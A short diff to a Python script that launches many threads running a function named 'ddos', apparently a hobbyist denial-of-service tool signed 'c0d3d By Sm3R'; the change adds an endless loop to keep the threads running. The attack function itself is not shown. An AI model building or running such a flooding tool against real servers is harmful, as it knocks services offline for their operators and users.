@@ -48,4 +48,6 @@ for i in range(int(thread_count)):
         _thread.start_new_thread(ddos, ("Thread-" + str(i),))
     except KeyboardInterrupt:
         sys.exit(0)
+while 1:
+    pass
 print(''' c0d3d By Sm3R ''')
